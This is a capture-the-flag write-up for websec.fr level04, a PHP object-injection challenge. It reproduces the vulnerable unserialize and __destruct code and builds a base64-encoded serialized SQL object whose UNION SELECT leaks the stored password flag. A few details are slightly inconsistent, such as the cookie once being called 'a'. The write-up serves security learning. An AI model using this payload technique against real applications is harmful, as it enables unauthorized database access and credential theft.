# level04 - 1 point
[Link to the challenge](http://websec.fr/level04)

## Description
```
Serialization is a pain!
```
Since we're lazy, we take advantage of php's garbage collector to properly display query results.
We also do like to write neat OOP. You can get the sources here and here.

## Write-up
They provide two PHP files that are used to process the requisitions made to the server and to the SQLite database that is running:

#### source1.php
``` PHP
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>

// There's some HTML code here, but we don't need it...
```

#### source2.php
``` PHP
<?php

class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

By analysing both of these scripts we can highlight some important stuff that will "enable" the attack:
- The `id` has to be numeric to normally execute a query (`if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id']))`);
- We have control over a cookie called `leet_hax0r`, that is base64 decoded and unserialized;
- `$sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));` might allow Object Injection because of the `unserialize()` method;
- The `SQL` class has a magic method ` __destruct()` (that is called when the PHP code executes the `die()` command), reinforcing the idea of an Object Injection;
 - When the `destruct()` method is called, it establishes a SQLite database connection and executes a query. We can inject a serialized object (class `SQL`) with a value for `$query` (which is public). SO, when the `destruct()` method is called, we execute the query we want.

Based on this, we firstly try the program with `id=1`. We discover that the username "flag" has the ID 1.

Then, just to be sure we analyse the `leet_hax0r` cookie we get: `YToxOntzOjI6ImlwIjtzOjE1OiIxNzkuMTU0LjE0Mi4yMzEiO30%3D`
``` bash
urlencode -d YToxOntzOjI6ImlwIjtzOjE1OiIxNzkuMTU0LjE0Mi4yMzEiO30%3D
YToxOntzOjI6ImlwIjtzOjE1OiIxNzkuMTU0LjE0Mi4yMzEiO30=

echo 'YToxOntzOjI6ImlwIjtzOjE1OiIxNzkuMTU0LjE0Mi4yMzEiO30=' | base64 -d
a:1:{s:2:"ip";s:15:"179.154.142.231";}

After unserializing we get:
(
    [ip] => 179.154.142.231
)
```

Ok, now back to the attack!

We can create our own SQL query, serialize it and base64 encode it. Then, we send it as the `a` cookie. This will trigger the `die()` function, because `$sess_data` won't be an array. As a consequence, the `destruct()` method of any existing `SQL` objects will be triggered, executing this piece of code:
``` PHP
if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
```

We need our query result to be from the "username" column. Therefore, we should use an UNION to bypass this and get a password:
``` SQL
SELECT username FROM users WHERE id=1 UNION SELECT password from users WHERE id=1";
```
Then, we serialize it: `O:3:"SQL":1:{s:5:"query";s:81:"SELECT username FROM users WHERE id=1 UNION SELECT password from users WHERE id=1";}`

And base64 encode it: `TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ==`

When we send our request with `leet_hax0r=TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6IlNFTEVDVCB1c2VybmFtZSBGUk9NIHVzZXJzIFdIRVJFIGlkPTEgVU5JT04gU0VMRUNUIHBhc3N3b3JkIGZyb20gdXNlcnMgV0hFUkUgaWQ9MSI7fQ==` we get as a response the flag's password:
```
Username: WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
```
which is what we needed to finish the challenge!

**Flag: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`**


---
#### Links that really helped me understand better what was going on:
https://www.notsosecure.com/remote-code-execution-via-php-unserialize/
https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection
https://www.php.net/manual/en/function.unserialize.php
https://www.geeksforgeeks.org/php-exit-function/

